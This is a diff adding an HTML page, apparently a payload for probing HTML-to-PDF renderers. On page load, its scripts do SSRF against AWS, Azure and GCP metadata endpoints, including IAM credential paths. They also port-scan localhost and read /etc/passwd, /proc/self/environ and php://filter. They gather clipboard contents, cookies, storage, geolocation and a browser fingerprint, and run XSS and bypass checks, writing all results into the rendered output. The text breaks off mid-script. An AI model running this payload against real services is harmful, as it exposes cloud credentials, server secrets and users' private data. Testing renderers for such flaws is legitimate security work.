@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>PDF Security Test - Data Output</title>
+<style>
+*{box-sizing:border-box}body{font-family:Consolas,Monaco,monospace;margin:0;padding:20px;background:#0a0a0a;color:#0f0;font-size:14px;line-height:1.6}h1{text-align:center;color:#f00;text-shadow:0 0 10px #f00;font-size:28px;border:3px solid #f00;padding:15px;margin-bottom:30px}h2{color:#0ff;border-left:5px solid #0ff;padding-left:10px;margin-top:40px;font-size:22px}h3{color:#ff0;margin-top:25px;font-size:18px}section{margin-bottom:50px;padding:20px;background:#1a1a1a;border:1px solid #333;border-radius:5px}.test-box{margin:20px 0;padding:15px;background:#000;border:1px solid #0f0;border-radius:3px}.result{color:#0f0;font-weight:bold}.error{color:#f00;font-weight:bold}.warning{color:#ff0;font-weight:bold}.info{color:#0ff}.data{background:#1a1a1a;padding:10px;margin:10px 0;border-left:3px solid #0f0;white-space:pre-wrap;word-break:break-all;font-family:Consolas,Monaco,monospace;font-size:12px;max-height:400px;overflow-y:auto}.label{color:#888;font-size:11px;text-transform:uppercase;margin-top:15px}.metadata{display:grid;grid-template-columns:200px 1fr;gap:10px;margin:10px 0}.metadata-key{color:#0ff;font-weight:bold}.metadata-val{color:#0f0}@media print{body{background:#fff;color:#000}h1{color:#000;text-shadow:none}h2{color:#000}.data{border-left:3px solid #000}}@media(max-width:768px){body{padding:10px;font-size:12px}h1{font-size:20px}h2{font-size:18px}h3{font-size:16px}}</style>
+</head>
+<body>
+<h1> PDF SECURITY TEST - FULL DATA EXTRACTION</h1>
+
+<section id="cat1">
+<h2>CATEGORY 1: NETWORK RECONNAISSANCE (SSRF)</h2>
+
+<div class="test-box">
+<h3> AWS Metadata Endpoint (169.254.169.254)</h3>
+<div class="label">Testing: http://169.254.169.254/latest/meta-data/</div>
+<div id="aws-meta-result"> Attempting connection...</div>
+<div id="aws-meta-data" class="data" style="display:none"></div>
+<script>
+fetch('http://169.254.169.254/latest/meta-data/',{mode:'no-cors',cache:'no-store'})
+.then(r=>r.text())
+.then(d=>{
+  document.getElementById('aws-meta-result').innerHTML='<span class="warning"> ACCESSIBLE - AWS Metadata Exposed!</span>';
+  document.getElementById('aws-meta-data').style.display='block';
+  document.getElementById('aws-meta-data').textContent='RAW METADATA:\n'+d;
+  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/',{mode:'no-cors'}).then(r=>r.text()).then(roles=>{
+    document.getElementById('aws-meta-data').textContent+='\n\nIAM ROLES:\n'+roles;
+  }).catch(()=>{});
+})
+.catch(e=>{
+  document.getElementById('aws-meta-result').innerHTML='<span class="result"> Blocked: '+e.message+'</span>';
+});
+</script>
+</div>
+
+<div class="test-box">
+<h3> Azure Metadata Endpoint</h3>
+<div class="label">Testing: http://169.254.169.254/metadata/instance?api-version=2021-02-01</div>
+<div id="azure-meta-result"> Attempting connection...</div>
+<div id="azure-meta-data" class="data" style="display:none"></div>
+<script>
+fetch('http://169.254.169.254/metadata/instance?api-version=2021-02-01',{
+  method:'GET',
+  headers:{'Metadata':'true'},
+  mode:'no-cors',
+  cache:'no-store'
+})
+.then(r=>r.text())
+.then(d=>{
+  document.getElementById('azure-meta-result').innerHTML='<span class="warning"> ACCESSIBLE - Azure Metadata Exposed!</span>';
+  document.getElementById('azure-meta-data').style.display='block';
+  document.getElementById('azure-meta-data').textContent='RAW METADATA:\n'+d;
+})
+.catch(e=>{
+  document.getElementById('azure-meta-result').innerHTML='<span class="result"> Blocked: '+e.message+'</span>';
+});
+</script>
+</div>
+
+<div class="test-box">
+<h3> GCP Metadata Endpoint</h3>
+<div class="label">Testing: http://metadata.google.internal/computeMetadata/v1/</div>
+<div id="gcp-meta-result"> Attempting connection...</div>
+<div id="gcp-meta-data" class="data" style="display:none"></div>
+<script>
+fetch('http://metadata.google.internal/computeMetadata/v1/',{
+  method:'GET',
+  headers:{'Metadata-Flavor':'Google'},
+  mode:'no-cors',
+  cache:'no-store'
+})
+.then(r=>r.text())
+.then(d=>{
+  document.getElementById('gcp-meta-result').innerHTML='<span class="warning"> ACCESSIBLE - GCP Metadata Exposed!</span>';
+  document.getElementById('gcp-meta-data').style.display='block';
+  document.getElementById('gcp-meta-data').textContent='RAW METADATA:\n'+d;
+})
+.catch(e=>{
+  document.getElementById('gcp-meta-result').innerHTML='<span class="result"> Blocked: '+e.message+'</span>';
+});
+</script>
+</div>
+
+<div class="test-box">
+<h3> Localhost Port Scan (Common Services)</h3>
+<div class="label">Scanning: Redis(6379), MySQL(3306), PostgreSQL(5432), MongoDB(27017), Elasticsearch(9200)</div>
+<div id="portscan-result"> Scanning ports...</div>
+<div id="portscan-data" class="data"></div>
+<script>
+const ports=[
+  {port:6379,service:'Redis'},
+  {port:3306,service:'MySQL'},
+  {port:5432,service:'PostgreSQL'},
+  {port:27017,service:'MongoDB'},
+  {port:9200,service:'Elasticsearch'},
+  {port:8080,service:'HTTP Alt'},
+  {port:8888,service:'HTTP Dev'},
+  {port:5000,service:'Flask'},
+  {port:3000,service:'Node'},
+  {port:4200,service:'Angular'}
+];
+let scanResults='PORT SCAN RESULTS:\n'+('='.repeat(60))+'\n';
+let completed=0;
+ports.forEach(({port,service})=>{
+  const start=performance.now();
+  const xhr=new XMLHttpRequest();
+  xhr.timeout=2000;
+  xhr.open('GET',`http://127.0.0.1:${port}`,true);
+  xhr.onload=()=>{
+    const time=(performance.now()-start).toFixed(2);
+    scanResults+=`\n[${port}] ${service.padEnd(15)}   OPEN (${time}ms)\nResponse: ${xhr.responseText.substring(0,200)}\n`;
+    document.getElementById('portscan-data').textContent=scanResults;
+  };
+  xhr.onerror=()=>{
+    const time=(performance.now()-start).toFixed(2);
+    scanResults+=`\n[${port}] ${service.padEnd(15)}  CLOSED (${time}ms)`;
+    if(++completed===ports.length){
+      document.getElementById('portscan-result').innerHTML='<span class="result"> Scan Complete</span>';
+    }
+    document.getElementById('portscan-data').textContent=scanResults;
+  };
+  xhr.ontimeout=()=>{
+    scanResults+=`\n[${port}] ${service.padEnd(15)}   TIMEOUT`;
+    if(++completed===ports.length){
+      document.getElementById('portscan-result').innerHTML='<span class="result"> Scan Complete</span>';
+    }
+    document.getElementById('portscan-data').textContent=scanResults;
+  };
+  xhr.send();
+});
+</script>
+</div>
+
+<div class="test-box">
+<h3> Internal Network DNS Resolution</h3>
+<div class="label">Testing: intranet.corp, internal.local, localhost.localdomain</div>
+<div id="dns-result"> Testing internal DNS...</div>
+<div id="dns-data" class="data"></div>
+<script>
+const internalDomains=['intranet.corp','internal.local','localhost.localdomain','admin.local','router.local'];
+let dnsResults='INTERNAL DNS RESOLUTION:\n'+('='.repeat(60))+'\n';
+internalDomains.forEach(domain=>{
+  const img=new Image();
+  img.onerror=()=>{
+    dnsResults+=`\n${domain}:  Not resolved`;
+    document.getElementById('dns-data').textContent=dnsResults;
+  };
+  img.onload=()=>{
+    dnsResults+=`\n${domain}:   RESOLVED! (Potentially accessible)`;
+    document.getElementById('dns-data').textContent=dnsResults;
+  };
+  img.src=`http://${domain}/favicon.ico?`+Math.random();
+});
+setTimeout(()=>{
+  document.getElementById('dns-result').innerHTML='<span class="result"> DNS Test Complete</span>';
+},3000);
+</script>
+</div>
+
+<div class="test-box">
+<h3> Protocol Smuggling Detection</h3>
+<div class="label">Testing: gopher, dict, ftp, ldap, file, tftp, ssh, telnet, smtp</div>
+<div id="proto-result"> Testing protocols...</div>
+<div id="proto-data" class="data"></div>
+<script>
+const protocols=[
+  {proto:'gopher',url:'gopher://127.0.0.1:6379/_INFO'},
+  {proto:'dict',url:'dict://127.0.0.1:6379/INFO'},
+  {proto:'ftp',url:'ftp://anonymous:pass@127.0.0.1/'},
+  {proto:'ldap',url:'ldap://127.0.0.1:389/'},
+  {proto:'file',url:'file:///etc/hosts'},
+  {proto:'tftp',url:'tftp://127.0.0.1:69/test'},
+  {proto:'ssh',url:'ssh://127.0.0.1:22/'},
+  {proto:'telnet',url:'telnet://127.0.0.1:23/'},
+  {proto:'smtp',url:'smtp://127.0.0.1:25/'}
+];
+let protoResults='PROTOCOL SMUGGLING:\n'+('='.repeat(60))+'\n';
+protocols.forEach(({proto,url})=>{
+  const img=new Image();
+  img.onload=()=>{
+    protoResults+=`\n${proto.toUpperCase().padEnd(10)}   LOADED - Protocol accessible!`;
+    document.getElementById('proto-data').textContent=protoResults;
+  };
+  img.onerror=()=>{
+    protoResults+=`\n${proto.toUpperCase().padEnd(10)}  Blocked`;
+    document.getElementById('proto-data').textContent=protoResults;
+  };
+  img.src=url;
+});
+setTimeout(()=>{
+  document.getElementById('proto-result').innerHTML='<span class="result"> Protocol Test Complete</span>';
+},2000);
+</script>
+</div>
+</section>
+
+<section id="cat2">
+<h2>CATEGORY 2: LOCAL FILE INCLUSION</h2>
+
+<div class="test-box">
+<h3> Direct File Access - /etc/passwd</h3>
+<div class="label">Testing: file:///etc/passwd</div>
+<div id="passwd-result"> Attempting file read...</div>
+<div id="passwd-data" class="data" style="display:none"></div>
+<script>
+const xhr=new XMLHttpRequest();
+xhr.open('GET','file:///etc/passwd',true);
+xhr.onload=()=>{
+  document.getElementById('passwd-result').innerHTML='<span class="warning">  FILE ACCESSIBLE - /etc/passwd READ!</span>';
+  document.getElementById('passwd-data').style.display='block';
+  document.getElementById('passwd-data').textContent='FILE CONTENTS:\n'+('='.repeat(60))+'\n'+xhr.responseText;
+};
+xhr.onerror=()=>{
+  document.getElementById('passwd-result').innerHTML='<span class="result"> Blocked - Cannot read file</span>';
+};
+xhr.send();
+</script>
+</div>
+
+<div class="test-box">
+<h3> Windows System Files</h3>
+<div class="label">Testing: file:///C:/Windows/System32/drivers/etc/hosts</div>
+<div id="hosts-result"> Attempting file read...</div>
+<div id="hosts-data" class="data" style="display:none"></div>
+<script>
+const xhrHosts=new XMLHttpRequest();
+xhrHosts.open('GET','file:///C:/Windows/System32/drivers/etc/hosts',true);
+xhrHosts.onload=()=>{
+  document.getElementById('hosts-result').innerHTML='<span class="warning">  FILE ACCESSIBLE - Windows hosts file READ!</span>';
+  document.getElementById('hosts-data').style.display='block';
+  document.getElementById('hosts-data').textContent='FILE CONTENTS:\n'+('='.repeat(60))+'\n'+xhrHosts.responseText;
+};
+xhrHosts.onerror=()=>{
+  document.getElementById('hosts-result').innerHTML='<span class="result"> Blocked - Cannot read file</span>';
+};
+xhrHosts.send();
+</script>
+</div>
+
+<div class="test-box">
+<h3> Environment Variables Extraction</h3>
+<div class="label">Reading: /proc/self/environ</div>
+<div id="environ-result"> Attempting read...</div>
+<div id="environ-data" class="data" style="display:none"></div>
+<script>
+const xhrEnv=new XMLHttpRequest();
+xhrEnv.open('GET','file:///proc/self/environ',true);
+xhrEnv.onload=()=>{
+  document.getElementById('environ-result').innerHTML='<span class="warning">  ENVIRONMENT VARIABLES EXPOSED!</span>';
+  document.getElementById('environ-data').style.display='block';
+  const envVars=xhrEnv.responseText.split('\0').filter(e=>e).join('\n');
+  document.getElementById('environ-data').textContent='ENVIRONMENT:\n'+('='.repeat(60))+'\n'+envVars;
+};
+xhrEnv.onerror=()=>{
+  document.getElementById('environ-result').innerHTML='<span class="result"> Blocked</span>';
+};
+xhrEnv.send();
+</script>
+</div>
+
+<div class="test-box">
+<h3> PHP Filter Wrapper Test</h3>
+<div class="label">Testing: php://filter/convert.base64-encode/resource=/etc/passwd</div>
+<div id="phpfilter-result"> Testing PHP wrapper...</div>
+<div id="phpfilter-data" class="data" style="display:none"></div>
+<script>
+const xhrPhp=new XMLHttpRequest();
+xhrPhp.open('GET','php://filter/convert.base64-encode/resource=/etc/passwd',true);
+xhrPhp.onload=()=>{
+  document.getElementById('phpfilter-result').innerHTML='<span class="warning">  PHP FILTER WRAPPER ACCESSIBLE!</span>';
+  document.getElementById('phpfilter-data').style.display='block';
+  document.getElementById('phpfilter-data').textContent='BASE64 ENCODED RESPONSE:\n'+('='.repeat(60))+'\n'+xhrPhp.responseText+'\n\nDECODED:\n'+('='.repeat(60))+'\n'+atob(xhrPhp.responseText);
+};
+xhrPhp.onerror=()=>{
+  document.getElementById('phpfilter-result').innerHTML='<span class="result"> Blocked</span>';
+};
+xhrPhp.send();
+</script>
+</div>
+</section>
+
+<section id="cat3">
+<h2>CATEGORY 3: DATA EXFILTRATION</h2>
+
+<div class="test-box">
+<h3> WebRTC Local IP Discovery</h3>
+<div class="label">Extracting: Local & Remote IP addresses</div>
+<div id="webrtc-result"> Discovering IPs...</div>
+<div id="webrtc-data" class="data"></div>
+<script>
+let ips=new Set();
+let ipData='WEBRTC IP DISCOVERY:\n'+('='.repeat(60))+'\n';
+const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+pc.createDataChannel('');
+pc.createOffer().then(offer=>pc.setLocalDescription(offer));
+pc.onicecandidate=e=>{
+  if(!e||!e.candidate)return;
+  const candidate=e.candidate.candidate;
+  const ipMatch=candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g);
+  if(ipMatch){
+    ipMatch.forEach(ip=>{
+      if(!ips.has(ip)){
+        ips.add(ip);
+        const type=candidate.includes('host')?'LOCAL':(candidate.includes('srflx')?'PUBLIC':'RELAY');
+        ipData+=`\n[${type}] ${ip}\nFull Candidate: ${candidate}\n`;
+        document.getElementById('webrtc-data').textContent=ipData;
+        if(ips.size>0){
+          document.getElementById('webrtc-result').innerHTML=`<span class="warning">  ${ips.size} IP(s) DISCOVERED!</span>`;
+        }
+      }
+    });
+  }
+};
+setTimeout(()=>{
+  if(ips.size===0){
+    document.getElementById('webrtc-result').innerHTML='<span class="result"> No IPs discovered</span>';
+    document.getElementById('webrtc-data').textContent='No WebRTC IPs found';
+  }
+  pc.close();
+},5000);
+</script>
+</div>
+
+<div class="test-box">
+<h3> Geolocation Extraction</h3>
+<div class="label">Requesting: GPS coordinates, accuracy, altitude</div>
+<div id="geo-result"> Requesting location...</div>
+<div id="geo-data" class="data" style="display:none"></div>
+<script>
+if(navigator.geolocation){
+  navigator.geolocation.getCurrentPosition(
+    pos=>{
+      document.getElementById('geo-result').innerHTML='<span class="warning">  GEOLOCATION OBTAINED!</span>';
+      document.getElementById('geo-data').style.display='block';
+      const geoInfo=`GEOLOCATION DATA:
+${'='.repeat(60)}
+Latitude:      ${pos.coords.latitude}
+Longitude:     ${pos.coords.longitude}
+Accuracy:      ${pos.coords.accuracy} meters
+Altitude:      ${pos.coords.altitude||'N/A'}
+Alt Accuracy:  ${pos.coords.altitudeAccuracy||'N/A'}
+Heading:       ${pos.coords.heading||'N/A'}
+Speed:         ${pos.coords.speed||'N/A'}
+Timestamp:     ${new Date(pos.timestamp).toISOString()}
+
+APPROXIMATE LOCATION:
+https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+      document.getElementById('geo-data').textContent=geoInfo;
+    },
+    err=>{
+      document.getElementById('geo-result').innerHTML='<span class="result"> Blocked: '+err.message+'</span>';
+    },
+    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
+  );
+}else{
+  document.getElementById('geo-result').innerHTML='<span class="result"> Geolocation not supported</span>';
+}
+</script>
+</div>
+
+<div class="test-box">
+<h3> Clipboard Content Reading</h3>
+<div class="label">Attempting: clipboard.readText()</div>
+<div id="clipboard-result"> Reading clipboard...</div>
+<div id="clipboard-data" class="data" style="display:none"></div>
+<script>
+if(navigator.clipboard&&navigator.clipboard.readText){
+  navigator.clipboard.readText()
+  .then(text=>{
+    document.getElementById('clipboard-result').innerHTML='<span class="warning">  CLIPBOARD ACCESSIBLE!</span>';
+    document.getElementById('clipboard-data').style.display='block';
+    document.getElementById('clipboard-data').textContent='CLIPBOARD CONTENTS:\n'+('='.repeat(60))+'\n'+(text||'(empty)')+'\n\nLength: '+text.length+' characters';
+  })
+  .catch(err=>{
+    document.getElementById('clipboard-result').innerHTML='<span class="result"> Blocked: '+err.message+'</span>';
+  });
+}else{
+  document.getElementById('clipboard-result').innerHTML='<span class="result"> API not available</span>';
+}
+</script>
+</div>
+
+<div class="test-box">
+<h3> Battery Status Extraction</h3>
+<div class="label">Extracting: Battery level, charging status, time remaining</div>
+<div id="battery-result"> Reading battery...</div>
+<div id="battery-data" class="data" style="display:none"></div>
+<script>
+if(navigator.getBattery){
+  navigator.getBattery().then(battery=>{
+    document.getElementById('battery-result').innerHTML='<span class="warning">  BATTERY INFO ACCESSIBLE!</span>';
+    document.getElementById('battery-data').style.display='block';
+    const batteryInfo=`BATTERY STATUS:
+${'='.repeat(60)}
+Level:              ${Math.round(battery.level*100)}%
+Charging:           ${battery.charging?'YES':'NO'}
+Time to Full:       ${battery.chargingTime===Infinity?'N/A':(battery.chargingTime/60).toFixed(1)+' min'}
+Time to Discharge:  ${battery.dischargingTime===Infinity?'N/A':(battery.dischargingTime/60).toFixed(1)+' min'}`;
+    document.getElementById('battery-data').textContent=batteryInfo;
+  }).catch(err=>{
+    document.getElementById('battery-result').innerHTML='<span class="result"> Blocked: '+err.message+'</span>';
+  });
+}else{
+  document.getElementById('battery-result').innerHTML='<span class="result"> API not supported</span>';
+}
+</script>
+</div>
+</section>
+
+<section id="cat4">
+<h2>CATEGORY 4: ENVIRONMENT FINGERPRINTING</h2>
+
+<div class="test-box">
+<h3> Complete Browser Fingerprint</h3>
+<div class="label">Extracting: Navigator, Screen, Canvas, WebGL, Fonts, Plugins</div>
+<div id="fingerprint-result"> Generating fingerprint...</div>
+<div id="fingerprint-data" class="data"></div>
+<script>
+let fingerprint=`BROWSER FINGERPRINT:
+${'='.repeat(60)}
+
+[NAVIGATOR]
+User Agent:         ${navigator.userAgent}
+Platform:           ${navigator.platform}
+Language:           ${navigator.language}
+Languages:          ${navigator.languages.join(', ')}
+Hardware Cores:     ${navigator.hardwareConcurrency}
+Device Memory:      ${navigator.deviceMemory||'N/A'} GB
+Max Touch Points:   ${navigator.maxTouchPoints}
+Online Status:      ${navigator.onLine}
+Cookies Enabled:    ${navigator.cookieEnabled}
+Do Not Track:       ${navigator.doNotTrack||'N/A'}
+WebDriver:          ${navigator.webdriver||false}
+
+[SCREEN]
+Resolution:         ${screen.width}x${screen.height}
+Available:          ${screen.availWidth}x${screen.availHeight}
+Color Depth:        ${screen.colorDepth} bits
+Pixel Depth:        ${screen.pixelDepth} bits
+Orientation:        ${screen.orientation?.type||'N/A'}
+Pixel Ratio:        ${window.devicePixelRatio}
+
+[WINDOW]
+Inner Size:         ${window.innerWidth}x${window.innerHeight}
+Outer Size:         ${window.outerWidth}x${window.outerHeight}
+Screen X/Y:         ${window.screenX}, ${window.screenY}
+
+[TIMEZONE]
+Timezone:           ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+Offset:             GMT${(new Date().getTimezoneOffset()/-60)}
+
+[HEADLESS DETECTION]
+Navigator WebDriver:  ${navigator.webdriver||false}
+Chrome Runtime:       ${!!window.chrome}
+Permissions:          ${!!navigator.permissions}
+Outer Width Zero:     ${window.outerWidth===0}
+
+`;
+
+// Canvas Fingerprint
+const canvas=document.createElement('canvas');
+const ctx=canvas.getContext('2d');
+canvas.width=200;
+canvas.height=50;
+ctx.textBaseline='top';
+ctx.font='14px Arial';
+ctx.fillStyle='#f00';
+ctx.fillRect(0,0,200,50);
+ctx.fillStyle='#0f0';
+ctx.fillText('CanvasTest',2,2);
+const canvasHash=canvas.toDataURL();
+fingerprint+=`[CANVAS FINGERPRINT]\nData URL (first 100 chars):\n${canvasHash.substring(0,100)}...\nHash Length: ${canvasHash.length}\n\n`;
+
+// WebGL Fingerprint
+const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');
+if(gl){
+  fingerprint+=`[WEBGL]\nVendor:   ${gl.getParameter(gl.VENDOR)}\nRenderer: ${gl.getParameter(gl.RENDERER)}\nVersion:  ${gl.getParameter(gl.VERSION)}\n\n`;
+}
+
+// Plugins
+fingerprint+=`[PLUGINS] (${navigator.plugins.length})\n`;
+for(let i=0;i<navigator.plugins.length;i++){
+  fingerprint+=`${i+1}. ${navigator.plugins[i].name}\n`;
+}
+
+// Fonts Detection
+fingerprint+=`\n[FONT DETECTION]\n`;
+const baseFonts=['monospace','sans-serif','serif'];
+const testFonts=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Trebuchet MS','Helvetica'];
+const detected=[];
+const span=document.createElement('span');
+span.style.position='absolute';
+span.style.left='-9999px';
+span.style.fontSize='72px';
+span.innerHTML='mmmmmmmmmmlli';
+document.body.appendChild(span);
+const baseWidths={};
+baseFonts.forEach(font=>{
+  span.style.fontFamily=font;
+  baseWidths[font]=span.offsetWidth;
+});
+testFonts.forEach(font=>{
+  let detected_flag=false;
+  baseFonts.forEach(baseFont=>{
+    span.style.fontFamily=`${font},${baseFont}`;
+    if(span.offsetWidth!==baseWidths[baseFont]){
+      detected_flag=true;
+    }
+  });
+  if(detected_flag)detected.push(font);
+});
+document.body.removeChild(span);
+fingerprint+=detected.map(f=>' '+f).join('\n')||'No fonts detected';
+
+document.getElementById('fingerprint-result').innerHTML='<span class="warning">  COMPLETE FINGERPRINT EXTRACTED!</span>';
+document.getElementById('fingerprint-data').textContent=fingerprint;
+</script>
+</div>
+
+<div class="test-box">
+<h3> Performance & Resource Timing</h3>
+<div class="label">Extracting: Navigation timing, resource loads, DNS times</div>
+<div id="perf-result"> Analyzing performance...</div>
+<div id="perf-data" class="data"></div>
+<script>
+setTimeout(()=>{
+  const t=performance.timing;
+  const nav=`PERFORMANCE TIMING:
+${'='.repeat(60)}
+
+[NAVIGATION]
+Navigation Start:      ${t.navigationStart}
+Request Start:         ${t.requestStart}
+Response Start:        ${t.responseStart}
+Response End:          ${t.responseEnd}
+DOM Loading:           ${t.domLoading}
+DOM Interactive:       ${t.domInteractive}
+DOM Complete:          ${t.domComplete}
+Load Event Start:      ${t.loadEventStart}
+Load Event End:        ${t.loadEventEnd}
+
+[CALCULATED TIMES]
+DNS Lookup:            ${t.domainLookupEnd-t.domainLookupStart}ms
+TCP Connection:        ${t.connectEnd-t.connectStart}ms
+Request Duration:      ${t.responseStart-t.requestStart}ms
+Response Duration:     ${t.responseEnd-t.responseStart}ms
+DOM Processing:        ${t.domComplete-t.domLoading}ms
+Total Load Time:       ${t.loadEventEnd-t.navigationStart}ms
+
+[RESOURCES LOADED]
+`;
+  const resources=performance.getEntriesByType('resource');
+  let resData=nav+`Total Resources: ${resources.length}\n\n`;
+  resources.slice(0,20).forEach((r,i)=>{
+    resData+=`${i+1}. ${r.name.split('/').pop()}\n   Type: ${r.initiatorType} | Duration: ${r.duration.toFixed(2)}ms | Size: ${r.transferSize||'N/A'} bytes\n`;
+  });
+  
+  document.getElementById('perf-result').innerHTML=`<span class="warning">  ${resources.length} RESOURCES ENUMERATED!</span>`;
+  document.getElementById('perf-data').textContent=resData;
+},1000);
+</script>
+</div>
+
+<div class="test-box">
+<h3> Storage & Quota Analysis</h3>
+<div class="label">Testing: localStorage, sessionStorage, IndexedDB, Cookies</div>
+<div id="storage-result"> Analyzing storage...</div>
+<div id="storage-data" class="data"></div>
+<script>
+let storageInfo=`STORAGE ANALYSIS:
+${'='.repeat(60)}
+
+`;
+
+// LocalStorage
+try{
+  localStorage.setItem('_test','value');
+  localStorage.removeItem('_test');
+  storageInfo+=`[LOCALSTORAGE]\nStatus:   ACCESSIBLE\nItems: ${localStorage.length}\nKeys:\n`;
+  for(let i=0;i<localStorage.length;i++){
+    const key=localStorage.key(i);
+    storageInfo+=`  ${key}: ${localStorage.getItem(key).substring(0,50)}\n`;
+  }
+}catch(e){
+  storageInfo+=`[LOCALSTORAGE]\nStatus:  Blocked (${e.message})\n`;
+}
+
+// SessionStorage
+storageInfo+=`\n`;
+try{
+  sessionStorage.setItem('_test','value');
+  sessionStorage.removeItem('_test');
+  storageInfo+=`[SESSIONSTORAGE]\nStatus:   ACCESSIBLE\nItems: ${sessionStorage.length}\n`;
+}catch(e){
+  storageInfo+=`[SESSIONSTORAGE]\nStatus:  Blocked (${e.message})\n`;
+}
+
+// Cookies
+storageInfo+=`\n[COOKIES]\n`;
+if(document.cookie){
+  const cookies=document.cookie.split(';');
+  storageInfo+=`Status:   ACCESSIBLE\nCount: ${cookies.length}\nData:\n`;
+  cookies.forEach(c=>storageInfo+=`  ${c.trim()}\n`);
+}else{
+  storageInfo+=`Status:  No cookies or blocked\n`;
+}
+
+// IndexedDB
+storageInfo+=`\n[INDEXEDDB]\n`;
+const dbReq=indexedDB.open('_test_db');
+dbReq.onsuccess=()=>{
+  storageInfo+=`Status:   ACCESSIBLE\n`;
+  dbReq.result.close();
+  indexedDB.deleteDatabase('_test_db');
+  document.getElementById('storage-data').textContent=storageInfo;
+};
+dbReq.onerror=()=>{
+  storageInfo+=`Status:  Blocked\n`;
+  document.getElementById('storage-data').textContent=storageInfo;
+};
+
+document.getElementById('storage-result').innerHTML='<span class="warning">  STORAGE ANALYSIS COMPLETE</span>';
+setTimeout(()=>{
+  document.getElementById('storage-data').textContent=storageInfo;
+},500);
+</script>
+</div>
+</section>
+
+<section id="cat5">
+<h2>CATEGORY 5: XSS & INJECTION TESTS</h2>
+
+<div class="test-box">
+<h3> Script Execution Detection</h3>
+<div class="label">Testing: inline scripts, event handlers, eval(), Function()</div>
+<div id="xss-result"> Testing XSS vectors...</div>
+<div id="xss-data" class="data"></div>
+<script>
+let xssTests=`XSS EXECUTION TESTS:
+${'='.repeat(60)}
+
+`;
+
+// Test eval
+try{
+  const evalResult=eval('2+2');
+  xssTests+=`[EVAL]   ENABLED - Result: ${evalResult}\n`;
+}catch(e){
+  xssTests+=`[EVAL]  Blocked: ${e.message}\n`;
+}
+
+// Test Function constructor
+try{
+  const funcResult=new Function('return 2+2')();
+  xssTests+=`[FUNCTION CONSTRUCTOR]   ENABLED - Result: ${funcResult}\n`;
+}catch(e){
+  xssTests+=`[FUNCTION CONSTRUCTOR]  Blocked: ${e.message}\n`;
+}
+
+// Test setTimeout with string
+try{
+  const testId=setTimeout("document.getElementById('xss-inline-test').textContent='EXECUTED'",0);
+  clearTimeout(testId);
+  xssTests+=`[SETTIMEOUT STRING]   ENABLED\n`;
+}catch(e){
+  xssTests+=`[SETTIMEOUT STRING]  Blocked: ${e.message}\n`;
+}
+
+// Test document.write
+try{
+  const oldWrite=document.write;
+  document.write('test');
+  xssTests+=`[DOCUMENT.WRITE]   ENABLED\n`;
+  document.write=oldWrite;
+}catch(e){
+  xssTests+=`[DOCUMENT.WRITE]  Blocked: ${e.message}\n`;
+}
+
+// Test innerHTML
+try{
+  const div=document.createElement('div');
+  div.innerHTML='<img src=x onerror=alert(1)>';
+  xssTests+=`[INNERHTML]   ENABLED - Can inject: ${div.innerHTML}\n`;
+}catch(e){
+  xssTests+=`[INNERHTML]  Blocked: ${e.message}\n`;
+}
+
+// Test insertAdjacentHTML
+try{
+  const div2=document.createElement('div');
+  div2.insertAdjacentHTML('beforeend','<script>alert(1)</script>');
+  xssTests+=`[INSERTADJACENTHTML]   ENABLED - Injected script tag\n`;
+}catch(e){
+  xssTests+=`[INSERTADJACENTHTML]  Blocked: ${e.message}\n`;
+}
+
+xssTests+=`\n[PROTO POLLUTION TEST]\n`;
+try{
+  Object.prototype.__test__='polluted';
+  const obj={};
+  if(obj.__test__==='polluted'){
+    xssTests+=`  VULNERABLE - Prototype pollution successful\n`;
+  }
+  delete Object.prototype.__test__;
+}catch(e){
+  xssTests+=` Protected: ${e.message}\n`;
+}
+
+document.getElementById('xss-result').innerHTML='<span class="warning">  XSS TESTS COMPLETE</span>';
+document.getElementById('xss-data').textContent=xssTests;
+</script>
+</div>
+
+<div class="test-box">
+<h3> Content Security Policy Detection</h3>
+<div class="label">Checking: CSP headers, meta tags, directives</div>
+<div id="csp-result"> Analyzing CSP...</div>
+<div id="csp-data" class="data"></div>
+<script>
+let cspInfo=`CONTENT SECURITY POLICY:
+${'='.repeat(60)}
+
+`;
+
+const cspMeta=document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+if(cspMeta){
+  cspInfo+=`[META TAG CSP]\n  PRESENT\n${cspMeta.content}\n\n`;
+}else{
+  cspInfo+=`[META TAG CSP]\n Not present in meta tags\n\n`;
+}
+
+// Try to detect CSP via violations
+cspInfo+=`[VIOLATION DETECTION]\nAttempting inline script execution...\n`;
+
+const inlineScript=document.createElement('script');
+inlineScript.textContent='window._cspTest=true';
+document.head.appendChild(inlineScript);
+
+setTimeout(()=>{
+  if(window._cspTest){
+    cspInfo+=`  No CSP or allows inline scripts\n`;
+  }else{
+    cspInfo+=` CSP blocks inline scripts\n`;
+  }
+  document.getElementById('csp-result').innerHTML='<span class="info">CSP Analysis Complete</span>';
+  document.getElementById('csp-data').textContent=cspInfo;
+},100);
+</script>
+</div>
+</section>
+
+<section id="cat6">
+<h2>CATEGORY 6: ENCODING BYPASS TESTS</h2>
+
+<div class="test-box">
+<h3> Character Encoding Tests</h3>
+<div class="label">Testing: Unicode, UTF-7, HTML entities, URL encoding, Base64</div>
+<div id="encoding-result"> Testing encodings...</div>
+<div id="encoding-data" class="data"></div>
+<script>
+let encodingTests=`ENCODING BYPASS TESTS:
+${'='.repeat(60)}
+
+[URL ENCODING]
+Original: <script>alert(1)</script>
+Encoded:  ${encodeURIComponent('<script>alert(1)</script>')}
+Decoded:  ${decodeURIComponent(encodeURIComponent('<script>alert(1)</script>'))}
+
+[DOUBLE URL ENCODING]
+Original: <script>alert(1)</script>
+Double:   ${encodeURIComponent(encodeURIComponent('<script>alert(1)</script>'))}
+Decoded:  ${decodeURIComponent(decodeURIComponent(encodeURIComponent(encodeURIComponent('<script>alert(1)</script>'))))}
+
